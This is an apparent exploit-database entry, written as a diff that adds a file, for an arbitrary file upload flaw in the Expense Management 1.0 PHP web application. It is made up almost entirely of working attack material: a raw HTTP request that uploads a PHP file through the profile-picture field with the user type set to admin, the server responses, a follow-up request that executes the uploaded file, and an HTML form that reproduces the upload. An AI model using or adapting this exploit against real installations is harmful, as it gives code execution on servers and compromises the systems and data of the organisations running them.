@@ -1,0 +1,92 @@
+# Exploit Title: Expense Management 1.0 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-10-30
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.webprojectbuilder.com/item/expense-management
+# Software Link: https://kent.dl.sourceforge.net/project/expense-management/php_ci-expense_manager-script-1.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/user/add_edit
+# 
+# http://localhost/[PATH]/assets/images/[FILE]
+# 
+POST /[PATH]/user/add_edit HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=upb6pa4qn0h16clnht4ugvhee1
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------187769406514267903921739782647
+Content-Length: 743
+-----------------------------187769406514267903921739782647
+Content-Disposition: form-data; name="profile_pic"; filename="phpinfo.php"
+Content-Type: application/force-download
+<?php
+phpinfo();
+?>
+-----------------------------187769406514267903921739782647
+Content-Disposition: form-data; name="fileOld"
+g_1540845821.php
+-----------------------------187769406514267903921739782647
+Content-Disposition: form-data; name="users_id"
+1
+-----------------------------187769406514267903921739782647
+Content-Disposition: form-data; name="user_type"
+admin
+-----------------------------187769406514267903921739782647
+Content-Disposition: form-data; name="submit1"
+-----------------------------187769406514267903921739782647--
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 20:50:40 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: ci_session=453324a77afd51a1fd2618b57d3dfd6c880da056; expires=Mon, 29-Oct-2018 22:50:40 GMT; Max-Age=7200; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+refresh: 0;url=http://localhost/[PATH]/user/login
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+GET /[PATH]/assets/images/phpinfo_1540846240.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=upb6pa4qn0h16clnht4ugvhee1; ci_session=453324a77afd51a1fd2618b57d3dfd6c880da056
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 20:51:11 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/user/add_edit
+# 
+<html>
+<body>
+<form method="post" enctype="multipart/form-data" action="http://localhost/[PATH]/user/add_edit">
+<input id="fileUpload" name="profile_pic" type="file"><br>
+<input name="fileOld" value="" type="hidden">
+<input name="users_id" value="1" type="hidden">
+<input name="user_type" value="admin" type="hidden">
+<button name="submit1" type="submit" ">Ver Ayari</button>  
+</form>
+</body>
+</html>
